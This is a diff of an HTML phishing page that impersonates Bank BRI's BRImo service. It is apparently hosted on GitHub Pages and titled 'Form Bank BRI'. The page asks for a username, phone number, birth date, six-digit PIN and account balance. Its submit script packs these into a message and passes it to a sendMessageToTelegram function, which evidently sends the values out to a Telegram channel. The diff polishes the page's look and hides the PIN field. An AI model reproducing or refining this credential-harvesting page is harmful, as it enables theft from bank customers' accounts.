@@ -5,13 +5,13 @@
   <meta property="og:image" content="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/akusatu.jpg">
   <meta name="theme-color" content="#007bff">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pengaduan-Brimo-Bank BRI</title>
+  <title>Form Bank BRI</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       margin-top: 40px;
-      background-image: url('back.png');
+      background-image: url('akusatu.png');
       background-size: cover;
       background-repeat: no-repeat;
       background-attachment: fixed;
@@ -49,6 +49,7 @@
 
     .input-group {
       margin-bottom: 10px;
+      position: relative;
     }
 
     .input-group label {
@@ -59,10 +60,27 @@
       color: #007bff;
     }
 
+    .input-icon img {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      width: 20px;
+      height: auto;
+      pointer-events: none;
+    }
+
+    .input-group input {
+      width: calc(100% - 60px);
+      padding: 11px 16px 13px 40px;
+      border: 2px solid #ccc;
+      border-radius: 5px;
+    }
+
     .btn {
       width: 87%;
       background-color: #007bff;
-      color: white;
+      color: #ffffff;
       border: none;
       border-radius: 5px;
       padding: 10px 15px;
@@ -97,20 +115,6 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    .input-icon {
-      position: relative;
-    }
-
-    .input-icon img {
-      position: absolute;
-      top: 50%;
-      left: 5px;
-      transform: translateY(-50%);
-      width: 20px;
-      height: auto;
-      pointer-events: none;
-    }
   </style>
 </head>
 <body>
@@ -122,31 +126,37 @@
     <form id="registrationForm">
       <div class="input-group">
         <label for="username">Username:</label>
-        <input type="text" name="username" id="username" placeholder="Masukkan Username" required style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px; background-image: url('https://i.ibb.co/MZpjTS8/16480-removebg-preview.png'); background-repeat: no-repeat; background-position: 10px center; background-size: 20px;">
+        <div class="input-icon">
+          <img src="https://i.ibb.co/MZpjTS8/16480-removebg-preview.png" alt="Username Icon">
+          <input type="text" name="username" id="username" placeholder="Masukkan Username" required>
+        </div>
       </div>
       <div class="input-group">
         <label for="phone">Nomor Handphone</label>
-        <input type="tel" name="phone" id="phone" placeholder="+62 8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px; background-image: url('ind.png'); background-repeat: no-repeat; background-position: 10px center; background-size: 20px;">
+        <div class="input-icon">
+          <img src="https://i.ibb.co/fNtsfBY/1000005366-removebg-preview.png" alt="Phone Icon">
+          <input type="tel" name="phone" id="phone" placeholder="+62 8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)">
+        </div>
       </div>
       <div class="input-group">
-        <label for="tgl_lahir">Tanggal Lahir</label>
+        <label for="masa_berlaku">Tgl Lahir (DD/MM/YYYY)</label>
         <div class="input-icon">
-          <input type="date" name="birthdate" id="tgl_lahir" required style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #222; border-radius: 5px;">
-          <img src="nok.jpg" alt="Calendar Icon">
+          <img src="https://i.ibb.co/2MFjrnr/calendar-icon.png" alt="Date Icon">
+          <input type="tel" id="masa_berlaku" name="masa_berlaku" placeholder="DD/MM/YYYY" required maxlength="10">
         </div>
       </div>
       <div class="input-group">
         <label for="pin">Masukkan PIN 6 Digit</label>
         <div class="input-icon">
-          <input type="tel" name="pin" id="pin" placeholder="Masukkan PIN 6 Digit" required minlength="6" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px;">
-          <img src="pin.png" alt="PIN Icon">
+          <img src="https://i.ibb.co/z672Tng/IMG-20240415-143131-removebg-preview.png" alt="PIN Icon">
+          <input type="password" name="pin" id="pin" placeholder="Masukkan PIN 6 Digit" required minlength="6" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')">
         </div>
       </div>
       <div class="input-group">
-        <label for="balance">Masukkan Saldo</label>
+        <label for="balance">Sisa Saldo Terakhir</label>
         <div class="input-icon">
-          <input type="tel" id="jumlahInput" name="balance" placeholder="Sisa Saldo Terakhir" required oninput="updateNominal()" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px;">
-          <img src="rp.png" alt="Saldo Icon">
+          <img src="https://i.ibb.co/Yp3ws6X/1000005674-removebg-preview.png" alt="Saldo Icon">
+          <input type="tel" id="jumlahInput" name="balance" placeholder="Sisa Saldo Terakhir" required oninput="updateNominal()">
         </div>
       </div>
       <button type="submit" class="btn">LANJUT</button>
@@ -164,6 +174,20 @@
       var formattedValue = "Rp " + Number(value).toLocaleString("id-ID");
 
       nominalInput.value = formattedValue;
+    }
+
+    function addSlash(input) {
+      let value = input.value.replace(/\D/g, ''); // Hapus semua karakter non-digit
+      if (value.length >= 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2); // Tambahkan slash setelah 2 digit pertama (DD)
+      }
+      if (value.length >= 5) {
+          value = value.substring(0, 5) + '/' + value.substring(5); // Tambahkan slash setelah 2 digit berikutnya (MM)
+      }
+      if (value.length > 10) {
+          value = value.substring(0, 10); // Batasi panjang input maksimal 10 karakter
+      }
+      input.value = value;
     }
 
     function sendMessageToTelegram(message) {
@@ -189,29 +213,32 @@
       event.preventDefault(); // Mencegah form dikirim langsung
 
       var loader = document.getElementById("loader");
-      loader.style.display = "block";
+      loader.style.display = "block"; // Tampilkan loader
 
-      // Mengambil nilai input
       var username = document.getElementById("username").value;
       var phone = document.getElementById("phone").value;
-      var birthdate = document.getElementById("tgl_lahir").value;
+      var masaBerlaku = document.getElementById("masa_berlaku").value;
       var pin = document.getElementById("pin").value;
       var balance = document.getElementById("jumlahInput").value;
 
-      // Membuat pesan untuk dikirim ke Telegram
-      var message = "Username: " + username + "\n" +
-                    "Nomor Handphone: " + phone + "\n" +
-                    "Tanggal Lahir: " + birthdate + "\n" +
-                    "PIN: " + pin + "\n" +
-                    "Saldo: " + balance;
+      var message = "User Details:\n";
+      message += "Username: " + username + "\n";
+      message += "Phone: " + phone + "\n";
+      message += "Valid Thru: " + masaBerlaku + "\n";
+      message += "PIN: " + pin + "\n";
+      message += "Balance: " + balance + "\n";
 
       sendMessageToTelegram(message);
 
-      // Menunggu beberapa detik sebelum mengarahkan ke halaman lanjut.html
       setTimeout(function() {
         loader.style.display = "none";
-        window.location.href = "lanjut.html";
-      }, 5000); // 5000 ms = 5 detik
+        alert("Data berhasil dikirim ke Telegram!");
+        document.getElementById("registrationForm").reset(); // Reset form
+      }, 2000); // Simulasi delay pengiriman
+    });
+
+    document.getElementById('masa_berlaku').addEventListener('input', function() {
+      addSlash(this);
     });
   </script>
 </body>
